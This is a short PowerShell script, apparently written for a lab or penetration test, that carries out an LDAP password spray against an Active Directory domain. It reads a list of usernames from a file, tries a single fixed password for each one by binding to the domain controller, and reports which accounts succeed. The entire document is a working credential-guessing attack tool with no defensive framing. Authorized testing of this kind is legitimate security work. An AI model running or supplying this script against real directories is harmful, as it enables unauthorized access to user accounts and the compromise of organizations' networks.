# Load the necessary assembly
Add-Type -AssemblyName System.DirectoryServices.Protocols

# Set up the LDAP server and base DN
$ldapServer = "172.16.54.140"  # Replace with your AD server IP or hostname
$baseDN = "DC=sentinel,DC=local"  # Base DN for your domain

# Read the users from the file
$users = Get-Content "C:\temp\userlist.txt"
$password = "Passw0rd1234"  # Password to spray

foreach ($user in $users) {
    # Format username for LDAP (e.g., username@sentinel.local)
    $userName = "$user@sentinel.local"  # Adjusted for your domain

    # Create a new LdapConnection
    $ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($ldapServer)

    # Create a NetworkCredential object
    $credential = New-Object System.Net.NetworkCredential($userName, $password)

    try {
        # Attempt to bind to the LDAP server with the user credentials
        $ldapConnection.Credential = $credential
        $ldapConnection.Bind()  # This will throw an exception if the authentication fails

        Write-Output "Success for $user"
    } catch {
        Write-Output "Failed for $user"
    } finally {
        # Dispose of the LdapConnection
        $ldapConnection.Dispose()
    }
}
